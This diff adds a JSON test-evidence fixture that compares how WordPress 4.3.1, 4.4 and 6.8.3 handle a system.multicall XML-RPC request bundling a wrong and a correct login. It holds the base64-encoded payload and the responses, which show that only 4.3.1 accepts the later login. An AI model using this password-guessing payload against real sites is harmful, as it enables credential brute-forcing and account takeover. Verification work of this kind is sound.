@@ -1,0 +1,185 @@
+{
+  "provenance": {
+    "native_evidence": "tmp/module-target-tests/20261109T171458-b13a24/wordpress_multicall/native-wordpress-multicall.json",
+    "native_evidence_sha256": "07ea97a6f54570c733cb0d4caf6fba12339f8192e66c4f8501d245b5383033ec",
+    "producer": "Independent REXML/Net::HTTP client and native PHP APIs in checksum-pinned genuine WordPress containers"
+  },
+  "profiles": {
+    "vulnerable": {
+      "version": "4.3.1",
+      "php": "5.6.40",
+      "xmlrpc_source_sha256": "101211f8409c0f3839ef4d5b369ac0ec24020ad5663468476dd49ad750dc6010",
+      "has_auth_failed_latch": false,
+      "active_plugins": [],
+      "wrong_then_right": {
+        "statuses": [
+          403,
+          "success"
+        ],
+        "request": {
+          "service": "vulnerable",
+          "method": "POST",
+          "path": "/xmlrpc.php",
+          "code": 200,
+          "request_body_base64": "PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48bWV0aG9kQ2FsbD48bWV0aG9kTmFtZT5zeXN0ZW0ubXVsdGljYWxsPC9tZXRob2ROYW1lPjxwYXJhbXM+PHBhcmFtPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXdyb25nLXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PC9kYXRhPjwvYXJyYXk+PC92YWx1ZT48L3BhcmFtPjwvcGFyYW1zPjwvbWV0aG9kQ2FsbD4=",
+          "headers": {
+            "date": [
+              "Mon, 09 Nov 2026 17:16:18 GMT"
+            ],
+            "server": [
+              "Apache/2.4.25 (Debian)"
+            ],
+            "x-powered-by": [
+              "PHP/5.6.40"
+            ],
+            "connection": [
+              "close"
+            ],
+            "vary": [
+              "Accept-Encoding"
+            ],
+            "content-length": [
+              "979"
+            ],
+            "content-type": [
+              "text/xml; charset=UTF-8"
+            ]
+          },
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <array><data>\n  <value><struct>\n  <member><name>faultCode</name><value><int>403</int></value></member>\n  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>\n</struct></value>\n  <value><array><data>\n  <value><array><data>\n  <value><struct>\n  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>\n  <member><name>url</name><value><string>http://127.0.0.1:50598/</string></value></member>\n  <member><name>blogid</name><value><string>1</string></value></member>\n  <member><name>blogName</name><value><string>Module target WordPress Multicall</string></value></member>\n  <member><name>xmlrpc</name><value><string>http://127.0.0.1:50598/xmlrpc.php</string></value></member>\n</struct></value>\n</data></array></value>\n</data></array></value>\n</data></array>\n      </value>\n    </param>\n  </params>\n</methodResponse>\n"
+        }
+      }
+    },
+    "fixed": {
+      "version": "4.4",
+      "php": "5.6.40",
+      "xmlrpc_source_sha256": "1e1bfa58d632e2bc8688f97afa00efec920ae51a0cc3e7377904ac8294bcb76f",
+      "has_auth_failed_latch": true,
+      "active_plugins": [],
+      "wrong_then_right": {
+        "statuses": [
+          403,
+          403
+        ],
+        "request": {
+          "service": "fixed",
+          "method": "POST",
+          "path": "/xmlrpc.php",
+          "code": 200,
+          "request_body_base64": "PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48bWV0aG9kQ2FsbD48bWV0aG9kTmFtZT5zeXN0ZW0ubXVsdGljYWxsPC9tZXRob2ROYW1lPjxwYXJhbXM+PHBhcmFtPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXdyb25nLXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PC9kYXRhPjwvYXJyYXk+PC92YWx1ZT48L3BhcmFtPjwvcGFyYW1zPjwvbWV0aG9kQ2FsbD4=",
+          "headers": {
+            "date": [
+              "Mon, 09 Nov 2026 17:16:19 GMT"
+            ],
+            "server": [
+              "Apache/2.4.25 (Debian)"
+            ],
+            "x-powered-by": [
+              "PHP/5.6.40"
+            ],
+            "connection": [
+              "close"
+            ],
+            "vary": [
+              "Accept-Encoding"
+            ],
+            "content-length": [
+              "615"
+            ],
+            "content-type": [
+              "text/xml; charset=UTF-8"
+            ]
+          },
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <array><data>\n  <value><struct>\n  <member><name>faultCode</name><value><int>403</int></value></member>\n  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>\n</struct></value>\n  <value><struct>\n  <member><name>faultCode</name><value><int>403</int></value></member>\n  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>\n</struct></value>\n</data></array>\n      </value>\n    </param>\n  </params>\n</methodResponse>\n"
+        }
+      }
+    },
+    "modern": {
+      "version": "6.8.3",
+      "php": "8.3.28",
+      "xmlrpc_source_sha256": "bd5de6b41c314ed103142784cb110d1ef32ee8e9f9206c5d01ca3d3f20568ca4",
+      "has_auth_failed_latch": true,
+      "active_plugins": [],
+      "wrong_then_right": {
+        "statuses": [
+          403,
+          403
+        ],
+        "request": {
+          "service": "modern",
+          "method": "POST",
+          "path": "/wordpress/xmlrpc.php",
+          "code": 200,
+          "request_body_base64": "PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48bWV0aG9kQ2FsbD48bWV0aG9kTmFtZT5zeXN0ZW0ubXVsdGljYWxsPC9tZXRob2ROYW1lPjxwYXJhbXM+PHBhcmFtPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXdyb25nLXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PHZhbHVlPjxzdHJ1Y3Q+PG1lbWJlcj48bmFtZT5tZXRob2ROYW1lPC9uYW1lPjx2YWx1ZT48c3RyaW5nPndwLmdldFVzZXJzQmxvZ3M8L3N0cmluZz48L3ZhbHVlPjwvbWVtYmVyPjxtZW1iZXI+PG5hbWU+cGFyYW1zPC9uYW1lPjx2YWx1ZT48YXJyYXk+PGRhdGE+PHZhbHVlPjxzdHJpbmc+bW9kdWxlX2FkbWluPC9zdHJpbmc+PC92YWx1ZT48dmFsdWU+PHN0cmluZz5tb2R1bGUtdGFyZ2V0LXBhc3N3b3JkPC9zdHJpbmc+PC92YWx1ZT48L2RhdGE+PC9hcnJheT48L3ZhbHVlPjwvbWVtYmVyPjwvc3RydWN0PjwvdmFsdWU+PC9kYXRhPjwvYXJyYXk+PC92YWx1ZT48L3BhcmFtPjwvcGFyYW1zPjwvbWV0aG9kQ2FsbD4=",
+          "headers": {
+            "date": [
+              "Mon, 09 Nov 2026 17:16:21 GMT"
+            ],
+            "server": [
+              "Apache/2.4.65 (Debian)"
+            ],
+            "x-powered-by": [
+              "PHP/8.3.28"
+            ],
+            "connection": [
+              "close"
+            ],
+            "vary": [
+              "Accept-Encoding"
+            ],
+            "content-length": [
+              "615"
+            ],
+            "content-type": [
+              "text/xml; charset=UTF-8"
+            ]
+          },
+          "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <array><data>\n  <value><struct>\n  <member><name>faultCode</name><value><int>403</int></value></member>\n  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>\n</struct></value>\n  <value><struct>\n  <member><name>faultCode</name><value><int>403</int></value></member>\n  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>\n</struct></value>\n</data></array>\n      </value>\n    </param>\n  </params>\n</methodResponse>\n"
+        }
+      }
+    }
+  },
+  "reviewed_older_sources": [
+    {
+      "version": "4.3.2",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/4.3.2/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "101211f8409c0f3839ef4d5b369ac0ec24020ad5663468476dd49ad750dc6010",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "4.2.6",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/4.2.6/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "5a236c0fb39c3ad62a2b5486d3aa1988853fa60ba6a9edbdfc27e701021e79a8",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "4.1.9",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/4.1.9/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "49377f63c88f2eadd567308cdcbf23f6caa0d7f4f12d82651698b6a17300fb06",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "4.0.9",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/4.0.9/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "2053bb10cf2c0926123653f952dfb02b3ceb6c5cadf2fe82d90fd059d29ea417",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "3.9.10",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/3.9.10/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "d8a91384c7a47e055025525525c495ed57132d7ba7df16b13228da3eacc7e318",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "3.8.12",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/3.8.12/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "cb02dc1064a5ffd57a43f62f31135957959509e117bdd440bb5dbc40658d17a5",
+      "auth_failed_mentions": 0
+    },
+    {
+      "version": "3.7.12",
+      "url": "https://raw.githubusercontent.com/WordPress/WordPress/3.7.12/wp-includes/class-wp-xmlrpc-server.php",
+      "sha256": "4c5cc36059c34079751f5616311663f6dbaf7164364baa7245042ab00981cca9",
+      "auth_failed_mentions": 0
+    }
+  ]
+}
